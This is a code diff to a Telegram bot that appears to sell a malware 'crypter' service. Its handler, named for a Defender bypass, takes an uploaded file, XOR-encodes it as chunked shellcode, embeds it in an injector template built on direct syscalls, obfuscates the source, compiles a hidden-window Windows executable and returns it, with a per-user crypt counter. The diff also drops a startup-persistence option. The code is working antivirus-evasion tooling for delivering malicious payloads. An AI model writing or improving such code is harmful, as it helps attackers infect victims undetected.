@@ -301,7 +301,7 @@ async def set_daily_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
 
 # Conversation states
-AWAIT_FILE, GET_FILENAME, GET_STARTUP_CHOICE = range(3)
+AWAIT_FILE, GET_FILENAME = range(2)
 
 async def wd_bypass_entry(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
     """Entry point for the crypter conversation, triggered by a button."""
@@ -367,46 +367,26 @@ async def file_upload_handler(update: Update, context: ContextTypes.DEFAULT_TYPE
     return GET_FILENAME
 
 async def get_filename(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
-    """Stores the desired filename and asks about startup persistence."""
+    """Stores the filename, then immediately obfuscates, compiles, sends, and cleans."""
+    if not update.message or not update.message.text:
+        return GET_FILENAME
+
     filename = update.message.text
     if not filename.lower().endswith('.exe'):
         filename += '.exe'
-
     context.user_data['output_filename'] = filename
 
-    keyboard = [
-        [
-            InlineKeyboardButton("Yes", callback_data="startup_yes"),
-            InlineKeyboardButton("No", callback_data="startup_no"),
-        ]
-    ]
-    reply_markup = InlineKeyboardMarkup(keyboard)
-
-    await update.message.reply_text(
-        "Filename saved. Should the file be added to startup for persistence?",
-        reply_markup=reply_markup
-    )
-
-    return GET_STARTUP_CHOICE
-
-async def get_startup_choice(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
-    """Stores startup choice, obfuscates, compiles, sends, and cleans."""
-    query = update.callback_query
-    await query.answer()
-
-    # The new stub does not have a startup/persistence option.
-    # This choice is now effectively ignored, but we keep the conversation flow.
-    startup = query.data == 'startup_yes'
+    await update.message.reply_text("Filename saved. Processing your file... This may take a moment.")
 
     input_path = context.user_data.get('input_path')
     output_filename = context.user_data.get('output_filename')
 
     if not input_path or not output_filename:
-        await edit_message(query, "Error: Missing data. Please start over.", None)
+        await update.message.reply_text("Error: Missing data. Please start over with /cancel.")
         context.user_data.clear()
         return ConversationHandler.END
 
-    uid = query.from_user.id
+    uid = update.effective_user.id
     udir = user_stub_dir(uid)
 
     # Define paths for the new stub files
@@ -417,8 +397,6 @@ async def get_startup_choice(update: Update, context: ContextTypes.DEFAULT_TYPE)
     compiled_exe_path = os.path.join(udir, f"compiled_{uid}.exe")
 
     try:
-        await edit_message(query, "Processing your file... This may take a moment.", None)
-
         # Copy syscall files to user's temp directory
         shutil.copy("new_Stub/syscalls.h", syscalls_h_path)
         shutil.copy("new_Stub/syscalls.cpp", syscalls_cpp_path)
@@ -433,11 +411,9 @@ async def get_startup_choice(update: Update, context: ContextTypes.DEFAULT_TYPE)
         obfuscated_chunks = [bytes([b ^ xor_key for b in chunk]) for chunk in chunks]
 
         # --- C++ Code Generation ---
-        # Read the new injector template
         with open("new_Stub/injector.cpp", "r", encoding="utf-8") as f:
             injector_content = f.read()
 
-        # Prepare the dynamic shellcode data block
         cpp_shellcode_definitions = ""
         for i, chunk in enumerate(obfuscated_chunks):
             hex_str = ", ".join([f"0x{b:02x}" for b in chunk])
@@ -455,32 +431,30 @@ const int num_chunks = {len(chunks)};
 const unsigned char xor_key = {xor_key};
 // --- End Shellcode Data ---
 """
-        # Find the placeholder block and replace it
         start_marker = "// --- Shellcode Data (Dummy Placeholder) ---"
         end_marker = "// --- End Shellcode Data ---"
         start_index = injector_content.find(start_marker)
         end_index = injector_content.find(end_marker)
 
         if start_index == -1 or end_index == -1:
-             await edit_message(query, "Error: Could not find shellcode placeholder in the stub.", None)
+             await update.message.reply_text("Error: Could not find shellcode placeholder in the stub.")
              return ConversationHandler.END
 
-        # Reconstruct the template with the dynamic shellcode
         cpp_template = injector_content[:start_index] + shellcode_data_replacement + injector_content[end_index + len(end_marker):]
 
         with open(injector_cpp_path, "w", encoding="utf-8") as f:
             f.write(cpp_template)
 
-        # Obfuscate the main injector C++ file
+        # Obfuscate
+        await update.message.reply_text("Obfuscating source code...")
         try:
-            await edit_message(query, "Obfuscating source code...", None)
             run_obfuscation(injector_cpp_path, obfuscated_injector_path)
         except Exception as e:
-            await edit_message(query, f"An error occurred during obfuscation: {e}", None)
+            await update.message.reply_text(f"An error occurred during obfuscation: {e}")
             return ConversationHandler.END
 
-        # Compile the obfuscated injector and the syscalls implementation
-        await edit_message(query, "Compiling your file...", None)
+        # Compile
+        await update.message.reply_text("Compiling your file...")
         compile_result = subprocess.run(
             ["g++", obfuscated_injector_path, syscalls_cpp_path, "-o", compiled_exe_path, "-static", "-O2", "-s", "-mwindows", "-w"],
             capture_output=True, text=True,
@@ -491,23 +465,22 @@ const unsigned char xor_key = {xor_key};
             print(f"Compilation failed for user {uid}:\n{error_msg}")
             if len(error_msg) > 4000:
                 error_msg = error_msg[:4000] + "\n...(truncated)"
-            await edit_message(query, error_msg, None)
+            await update.message.reply_text(error_msg)
             return ConversationHandler.END
 
         with open(compiled_exe_path, "rb") as f:
             await context.bot.send_document(chat_id=uid, document=f, filename=output_filename)
 
         increment_crypt_count(uid)
-        await edit_message(query, "✅ File created and sent successfully.", None)
+        await update.message.reply_text("✅ File created and sent successfully.")
 
     except Exception as e:
         import traceback
         print(f"An exception occurred for user {uid}:")
         traceback.print_exc()
-        await edit_message(query, f"An unexpected error occurred: {e}", None)
+        await update.message.reply_text(f"An unexpected error occurred: {e}")
 
     finally:
-        # Clean up all temporary files
         paths_to_clean = [
             input_path, injector_cpp_path, syscalls_h_path,
             syscalls_cpp_path, obfuscated_injector_path, compiled_exe_path
@@ -549,7 +522,6 @@ def main():
         states={
             AWAIT_FILE: [MessageHandler(filters.Document.ALL, file_upload_handler)],
             GET_FILENAME: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_filename)],
-            GET_STARTUP_CHOICE: [CallbackQueryHandler(get_startup_choice, pattern="^startup_(yes|no)$")],
         },
         fallbacks=[
             CommandHandler("cancel", cancel),
